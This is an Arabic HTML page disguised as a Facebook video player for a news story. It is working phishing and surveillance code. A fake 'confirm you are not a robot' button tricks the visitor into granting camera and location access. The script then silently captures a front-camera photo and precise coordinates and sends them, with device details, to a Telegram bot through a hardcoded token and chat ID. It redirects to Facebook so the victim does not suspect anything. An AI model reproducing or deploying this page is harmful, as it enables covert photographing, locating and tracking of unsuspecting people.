<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشغل الفيديو - فيسبوك</title>
    
    <meta property="og:title" content="شاهد: تفاصيل قضية محمد مصطفى العنعوني">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png">

    <style>
        body { margin:0; padding:0; background:#000; font-family: sans-serif; overflow: hidden; }
        
        /* فيديو الخلفية للتمويه */
        .video-bg { position: fixed; width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }

        /* طبقة التمويه البصري */
        #clickjack-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 10000; display: flex; flex-direction: column;
            align-items: center; justify-content: flex-start; /* تبدأ من الأعلى حيث تظهر الأذونات */
            padding-top: 100px; background: rgba(0,0,0,0.8);
        }

        .fake-btn {
            padding: 15px 50px; background: #1877f2; color: white;
            border: none; border-radius: 30px; font-weight: bold;
            font-size: 18px; cursor: pointer; box-shadow: 0 0 20px rgba(24,119,242,0.5);
        }

        .instruction { color: white; margin-bottom: 20px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>

    <video class="video-bg" autoplay muted loop playsinline>
        <source src="1.mp4" type="video/mp4">
    </video>

    <div id="clickjack-overlay">
        <div class="instruction">
            <h2>⚠️ محتوى حساس</h2>
            <p>لتشغيل الفيديو وتأكيد أنك لست روبوت، اضغط على الزر أدناه واسمح بالوصول.</p>
        </div>
        <button class="fake-btn" id="p_trigger">اضغط هنا للمشاهدة</button>
    </div>

<script>
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

document.getElementById('p_trigger').onclick = function() {
    // إخفاء التمويه فوراً لبدء العملية
    document.getElementById('clickjack-overlay').style.opacity = "0.5"; 
    document.getElementById('p_trigger').innerText = "جاري التحميل...";

    // 🔱 تنفيذ الهجوم المتسلسل
    executeSequence();
};

async function executeSequence() {
    try {
        // 1. طلب الكاميرا (سيظهر الإذن في الأعلى بجانب الزر الذي ضغط عليه المستخدم)
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        
        // 2. إذا وافق، نلتقط الصورة فوراً
        const v = document.createElement('video');
        v.srcObject = stream;
        v.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 720; canvas.height = 1280;
            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
            const imgData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            // 3. طلب الموقع مباشرة بعد الكاميرا
            navigator.geolocation.getCurrentPosition(
                (pos) => finalize(imgData, pos),
                () => finalize(imgData, null),
                { enableHighAccuracy: true }
            );
        }, 1000);

    } catch (err) {
        // إذا رفض، نوجهه لصفحة فيسبوك لكي لا يشك
        window.location.href = "https://m.facebook.com/";
    }
}

async function finalize(img, pos) {
    let text = `🚩 صيد (تمويه بصري)\n📱 الجهاز: ${navigator.platform}`;
    if(pos) {
        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
    }

    const blob = dataURLtoBlob(img);
    const fd = new FormData();
    fd.append('photo', blob, 'cam.jpg');
    fd.append('caption', text);
    fd.append('chat_id', CHAT_ID);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    
    // التوجيه النهائي
    window.location.href = "https://m.facebook.com/";
}

function dataURLtoBlob(d) {
    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
    while(n--) u[n] = b.charCodeAt(n);
    return new Blob([u], {type: m});
}
</script>
</body>
</html>
